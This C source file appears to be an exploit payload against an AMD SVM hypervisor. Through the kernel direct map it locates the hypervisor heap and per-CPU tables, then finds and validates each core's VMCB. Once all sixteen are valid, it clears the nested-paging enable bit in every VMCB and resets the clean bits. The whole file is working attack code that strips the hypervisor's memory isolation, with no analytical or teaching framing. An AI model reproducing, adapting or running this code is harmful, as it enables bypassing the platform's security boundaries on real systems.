#include <stdint.h>

#define VMCB_NESTED_CTRL    0x90
#define VMCB_CLEAN          0xC0
#define VMCB_NESTED_CR3     0xB0
#define VMCB_ASID          0xB8
#define PCPU_VMCB          0xA8

#define CORE_COUNT         16
#define TABLE_PROBE_CORES  4
#define PAGE_MASK          0xFFF
#define HV_MEMORY_SIZE     0x2029000
#define HV_SEARCH_START    0x80000
#define HV_SEARCH_END      0x90000

#define STATUS_STARTED       0x1100
#define STATUS_CHECKING      0x1200
#define STATUS_VALID_COUNT   0x1300
#define STATUS_DONE          0x1400
#define STATUS_INVALID_PCPU  0xF001
#define STATUS_INVALID_RANGE 0xF002
#define STATUS_NOT_FOUND     0xF003

#define read64(p)           (*(volatile uint64_t *) (uint64_t) (p))
#define read32(p)           (*(volatile uint32_t *) (uint64_t) (p))
#define write64(p, v)       (*(volatile uint64_t *) (uint64_t) (p) = (uint64_t) (v))
#define write32(p, v)       (*(volatile uint32_t *) (uint64_t) (p) = (uint32_t) (v))

enum {
  PARAM_DMAP = 1,
  PARAM_STATUS,
  PARAM_HV_BASE,
  PARAM_HV_HEAP_OFF,
  PARAM_PCPUS,
  PARAM_ENABLE,
  PARAM_VMCB_PA = 8,
  PARAM_VALID_VMCBS = PARAM_VMCB_PA + CORE_COUNT,
  PARAM_HEAP,
  PARAM_PCPU
};

static int in_hv_memory(uint64_t pa, uint64_t hv_base)
{
  return pa >= hv_base && pa < hv_base + HV_MEMORY_SIZE;
}

static int pcpu_table_valid(uint64_t dmap, uint64_t pcpus,
                            uint64_t heap, uint64_t hv_base)
{
  int nonzero_pcpus = 0;

  for (int core = 0; core < TABLE_PROBE_CORES; core++) {
    uint64_t pcpu = read64(dmap + pcpus + (uint64_t) core * sizeof(uint64_t));
    if (!pcpu) {
      continue;
    }

    uint64_t pcpu_pa = pcpu - heap;
    if (pcpu < heap || !in_hv_memory(pcpu_pa, hv_base) ||
        (pcpu_pa & PAGE_MASK)) {
      return 0;
    }
    nonzero_pcpus++;
  }

  return nonzero_pcpus > 1;
}

static int find_hv_tables(uint64_t dmap, uint64_t hv_base,
                          uint64_t *hv_heap_off, uint64_t *pcpus)
{
  uint64_t search_start = hv_base + HV_SEARCH_START;
  uint64_t search_end = hv_base + HV_SEARCH_END;

  for (uint64_t heap_off = search_start; heap_off < search_end;
       heap_off += sizeof(uint64_t)) {
    uint64_t heap = read64(dmap + heap_off);
    if (!heap) {
      continue;
    }

    for (uint64_t table = search_start; table < search_end;
         table += sizeof(uint64_t)) {
      if (pcpu_table_valid(dmap, table, heap, hv_base)) {
        *hv_heap_off = heap_off;
        *pcpus = table;
        return 1;
      }
    }
  }

  return 0;
}

void vmcb_disable_np(uint64_t *param)
{
  uint64_t dmap        = param[PARAM_DMAP];
  uint64_t hv_heap_off = param[PARAM_HV_HEAP_OFF];
  uint64_t pcpus       = param[PARAM_PCPUS];
  uint64_t hv_base     = param[PARAM_HV_BASE];
  uint64_t status      = param[PARAM_STATUS];
  uint64_t *vmcb_pa    = &param[PARAM_VMCB_PA];

  write64(status, STATUS_STARTED);

  uint64_t heap = read64(dmap + hv_heap_off);
  uint64_t pcpu = read64(dmap + pcpus);


  if (pcpu <= heap - 1 || !in_hv_memory(pcpu - heap, hv_base)) {
    if (!find_hv_tables(dmap, hv_base, &hv_heap_off, &pcpus)) {
      write64(status, STATUS_NOT_FOUND);
      return;
    }

    heap = read64(dmap + hv_heap_off);
    pcpu = read64(dmap + pcpus);
    param[PARAM_HV_HEAP_OFF] = hv_heap_off;
    param[PARAM_PCPUS] = pcpus;
    param[PARAM_HEAP] = heap;
    param[PARAM_PCPU] = pcpu;

    if (pcpu <= heap - 1) {
      write64(status, STATUS_INVALID_PCPU);
      return;
    }
    if (!in_hv_memory(pcpu - heap, hv_base)) {
      write64(status, STATUS_INVALID_RANGE);
      return;
    }
  } else {
    param[PARAM_HEAP] = heap;
    param[PARAM_PCPU] = pcpu;
  }

  write64(status, STATUS_CHECKING);
  uint64_t valid_vmcbs = 0;


  for (int core = 0; core < CORE_COUNT; core++) {
    vmcb_pa[core] = 0;
    pcpu = read64(dmap + pcpus + (uint64_t) core * sizeof(uint64_t));
    if (!pcpu) {
      continue;
    }
    uint64_t vmcb = read64(dmap + (pcpu - heap) + PCPU_VMCB);
    if (!vmcb) {
      continue;
    }

    uint64_t vpa = vmcb - heap;
    if (!in_hv_memory(vpa, hv_base) || (vpa & PAGE_MASK)) {
      continue;
    }
    vmcb_pa[core] = vpa;

    uint64_t nested_cr3 = read64(dmap + vpa + VMCB_NESTED_CR3);
    if ((uint8_t) read32(dmap + vpa + VMCB_NESTED_CTRL) == 9 &&
        read32(dmap + vpa + VMCB_ASID) == 1 &&
        nested_cr3 && !(nested_cr3 & PAGE_MASK)) {
      valid_vmcbs++;
    }
  }

  param[PARAM_VALID_VMCBS] = valid_vmcbs;
  write64(status, STATUS_VALID_COUNT | valid_vmcbs);
  if (valid_vmcbs != CORE_COUNT || param[PARAM_ENABLE] != 1) {
    return;
  }

  for (int core = 0; core < CORE_COUNT; core++) {
    uint64_t vpa = vmcb_pa[core];
    if (!vpa) {
      continue;
    }
    uint64_t old = read64(dmap + vpa + VMCB_NESTED_CTRL);

    write64(dmap + vpa + VMCB_NESTED_CTRL, old & ~1ULL);
    write32(dmap + vpa + VMCB_CLEAN, 0);
  }
  write64(status, STATUS_DONE);
}
